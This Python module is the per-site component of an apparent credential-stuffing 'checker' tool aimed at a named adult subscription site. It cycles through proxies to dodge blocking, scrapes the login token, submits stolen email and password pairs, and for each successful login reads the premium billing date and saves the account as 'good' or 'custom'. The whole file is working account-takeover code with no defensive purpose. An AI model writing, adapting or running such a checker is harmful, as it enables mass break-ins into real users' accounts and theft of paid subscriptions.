from modules.variables import Checker
from modules.functions import set_proxy, log, save, bad_proxy
from requests import Session

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:   
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        headers = {
            "Content-Type":"application/x-www-form-urlencoded",
            "Host": "www.pornhubpremium.com" ,
            "Origin": "https://www.pornhubpremium.com" ,
            "Referer": "https://www.pornhubpremium.com/premium/login" ,
            "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" ,
            "sec-ch-ua-mobile": "?0" ,
            "Sec-Fetch-Dest": "empty" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Site": "same-origin" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36" ,
            "X-Requested-With": "XMLHttpRequest"
        }
        data = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straight"
        try:
            with Session() as s:
                token = s.get("https://www.pornhubpremium.com/premium/login",proxies=proxy_set,timeout=Checker.timeout).text.split("<input type=\"hidden\" name=\"token\" id=\"token\" value=\"")[1].split("\" />")[0]
                response = s.post("https://www.pornhubpremium.com/front/authenticate",headers=headers,data=data.format(email,password,token),proxies=proxy_set,timeout=Checker.timeout).text
                if "success\":\"0\",\"" in response:
                    retries += 1
                elif "success\":\"1\",\"" in response:
                    plan = s.get("https://www.pornhubpremium.com/user/manage/start",proxies=proxy_set,timeout=Checker.timeout).text
                    if "Next Billing Date" in plan:
                        expiry = plan.split("p id=\"expiryDatePremium\">Next Billing Date ")[1].split("</date></p>")[0]
                        if not Checker.cui:
                            log("good",email+":"+password+f" | Expire: {expiry}","Pornhub")
                        save("Pornhub","good",Checker.time,email+":"+password+f" | Expire: {expiry}")
                        Checker.good += 1
                        Checker.cpm += 1
                        return
                    else:
                        if not Checker.cui:
                            log("custom",email+":"+password,"Pornhub")
                        save("Pornhub","custom",Checker.time,email+":"+password)
                        Checker.custom += 1
                        Checker.cpm += 1
                        return
                else:
                    raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return